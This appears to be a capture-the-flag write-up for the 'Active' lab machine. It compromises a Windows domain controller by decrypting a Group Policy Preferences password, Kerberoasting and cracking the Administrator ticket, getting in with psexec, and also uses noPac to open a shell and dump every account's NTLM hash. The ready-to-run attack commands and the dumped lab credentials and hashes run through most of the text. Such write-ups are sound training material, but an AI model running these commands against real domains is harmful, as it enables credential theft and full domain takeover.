# Active
## Information Gathering
#### Ports/Services
x 53/tcp      domain        
x 88/tcp      kerberos-sec  
135/tcp     msrpc         
139/tcp     netbios-ssn   
389/tcp     ldap          
445/tcp     microsoft-ds? 
464/tcp     kpasswd5?     
593/tcp     ncacn_http    
636/tcp     tcpwrapped    
3268/tcp    ldap          
3269/tcp    tcpwrapped    
5722/tcp    msrpc         
9389/tcp    mc-nmf        
47001/tcp   http          
49152/tcp   msrpc         
49153/tcp   msrpc         
49154/tcp   msrpc         
49155/tcp   msrpc         
49157/tcp   ncacn_http    
49158/tcp   msrpc         
49165/tcp   msrpc         
49168/tcp   msrpc         
49174/tcp   msrpc


## Enumeration
### Nmap scan
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-09-19 22:55:14Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49168/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49174/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

### 53/tcp
- Microsoft DNS 6.1.7601
- Implies Windows Server 2008 R2 SP1
- Got PTR hit from dig

### 88/tcp
- Microsoft Windows Kerberos


### 135/tcp
- Microsoft Windows RPC
- Architecture is 64-bit

### 139/tcp, 445/tcp
- Username '', password '' allowed
- Shares
	- ADMIN$ - NO ACCESS
	- C$ - NO ACCESS
	- IPC$ - NO ACCESS
	- NETLOGON - NO ACCESS
	- Replication - READ ONLY
	- SYSVOL - NO ACCESS
	- Users - NO ACCESS


- Checking out share: `Replication`
	- Groups.xml
	- Registry.pol


- Checking out Groups.xml
- [This](https://adsecurity.org/?p=2288) post explains a little bit about Group Policy Preferences (GPP)
	- When a new GPP is created, there's an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted which should be good enough...
	- In 2012 Microsoft published the AES private key allowing anyone to decrypt the password
	- I used [this](https://github.com/t0thkr1s/gpp-decrypt) tool to decrypt the password
```bash
./gpp-decrypt.py -f Groups.xml

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```
- Trying `evil-winrm` and `psexec`  - both of these fail
- This set of credentials allows us to re-enumerate SMB
- smbmap as `active.htb\SVC_TGS:GPPstillStandingStrong2k18`
	- ADMIN$ - NO ACCESS
	- C$ - NO ACCESS
	- IPC$ - NO ACCESS
	- NETLOGON - READ ONLY
	- Replication - READ ONLY 
	- SYSVOL - READONLY
	- Users - READ ONLY
- NETLOGON
	- Nothing
- Users
	- User home directories
	- Odd NTUSER.DAT log files in "Default" home directory
		- Default Home Directory
			- AppData
			- Application Data - D
			- Cookies - D
			- Desktop - N
			- Documents - N
			- Downloads - N
			- Favorites - N
- SYSVOL

- Kerberoasting
```bash
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile kerberoast.hashes
```
- This gets me a hash for Administrator. 
- Attempt to crack
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hashes

Ticketmaster1968 (?)
```
- You can now use psexec to remote in
```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```


- Unintended Method
- I try noPac after hitting a wall
```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb -M nopac
```
- This reports that the DC is vulnerable
- Reverse Shell
```bash
sudo python3 noPac.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -shell --impersonate administrator -use-ldap
```
- Dumping hashes
```bash
sudo python3 noPac.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 --impersonate administrator -use-ldap -dump -use-vss
```
- Successfully dump the hashes of all accounts
- Here I could re-enumerate everything using the Administrators hash. 
- I can also remote in using psexec
```bash
impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed" Administrator@10.10.10.100
```

## Exploitation
After grabbing the `Groups.xml` file from the Replication share you can decrypt it for the password to SVC_TGS.

With the credentials `SVC_TGS:GPPstillStandingStrong2k18` you can perform a remote Kerberoasting attack
```bash
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile kerberoast.hashes
```
Which gets you a ticket for the Administrator SPN.

You can then crack it offline:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hashes

Ticketmaster1968 (?)
```

And use the cracked password to remote into the box.

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

## Privilege Escalation
You drop into this box as SYSTEM.

## Domain Information
### Password Policy
```
Minimum password length: 7
Password history length: 24
Maximum password age: 41 days 23 hours 53 minutes 
             
Password Complexity Flags: 000001
Domain Refuse Password Change: 0
Domain Password Store Cleartext: 0
Domain Password Lockout Admins: 0
Domain Password No Clear Change: 0
Domain Password No Anon Change: 0
Domain Password Complex: 1
             
Minimum password age: 1 day 4 minutes 
Reset Account Lockout Counter: 30 minutes 
Locked Account Duration: 30 minutes 
Account Lockout Threshold: None
Forced Log off Time: Not Set
```

### Users
```
Administrator
Guest
krbtgt
SVC_TGS
```

### Hashes
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:3b71a60d25518522d4f390abce0feb17:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
```